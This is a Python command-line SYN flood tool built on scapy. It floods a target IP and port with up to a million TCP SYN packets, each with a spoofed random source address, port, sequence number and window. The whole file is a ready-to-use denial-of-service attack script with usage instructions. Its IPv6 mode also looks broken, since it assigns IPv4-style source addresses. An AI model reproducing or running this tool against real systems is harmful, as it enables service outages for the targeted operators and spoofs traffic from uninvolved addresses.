#!/usr/bin/env python

"""
Syn flood script in python

Original from # Emre Ovunc # info@emreovunc.com
Python SYN Flood Tool CMD v2.0.1
"""


import sys
from argparse import ArgumentParser
from random import randint

from scapy.layers.inet import IP, TCP
from scapy.layers.inet6 import IPv6
from scapy.sendrecv import send


def random_ip():
    """ generate a random IP number """
    return ".".join(map(str, (randint(0, 255)for _ in range(4))))


def rand_int():
    """ return a random integer """
    return randint(1000, 9000)


def syn_flood(dst_ip, dst_port, counter, *, six: bool):
    """ syn flood tcpv4/tcpv6 """
    print("Sending Packets...")

    for _ in range(counter):
        s_port = rand_int()
        s_eq = rand_int()
        w_indow = rand_int()

        ip_packet = IPv6() if six else IP()
        ip_packet.src = random_ip()
        ip_packet.dst = dst_ip

        tcp_packet = TCP()
        tcp_packet.sport = s_port
        tcp_packet.dport = int(dst_port)
        tcp_packet.flags = "S"
        tcp_packet.seq = s_eq
        tcp_packet.window = w_indow

        send(ip_packet/tcp_packet, verbose=0)
        print(".", end="")
        sys.stdout.flush()


def main():
    """ main entry point """
    parser = ArgumentParser()
    parser.add_argument(
            "--target",
            "-t",
            help="target IP address",
            default="server",
    )
    parser.add_argument(
            "--port",
            "-p",
            help="target port number",
            default="8080",
    )
    parser.add_argument(
            "--count",
            "-c",
            help="number of packets",
            default="1000000",
    )
    parser.add_argument(
            "--format",
            "-f",
            help="format of target (4/6 4 is default)",
            default="4",
    )
    parser.add_argument(
            "--version",
            "-v",
            action="version",
            version="Python SynFlood Tool v2.0.1",
    )
    parser.epilog = f"Usage: {sys.argv[0]} -t 10.20.30.40 -p 8080 -c 1 -f 6"

    args = parser.parse_args()

    syn_flood(args.target, args.port, int(args.count), six=args.format == "6")


main()
